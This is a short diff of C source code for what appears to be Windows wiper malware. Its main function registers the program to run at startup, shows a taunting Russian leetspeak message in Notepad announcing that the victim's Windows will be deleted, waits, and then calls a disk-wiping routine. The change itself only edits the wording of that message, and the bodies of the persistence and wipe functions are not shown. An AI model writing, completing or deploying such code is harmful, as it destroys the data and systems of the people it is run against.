@@ -22,7 +22,7 @@ void addToStartup() {
 
 int main() {
     addToStartup();
-    system("start notepad.exe \"3драBctBYuТе, ваша вunд0ус будEt YDаЛEH, П0КА П0КА\"");
+    system("start notepad.exe \"3драBctBYuТе, ваша вunд0ус будEt YDаЛEHа, П0КА П0КА\"");
     Sleep(10000);
     wipeDisk();
 
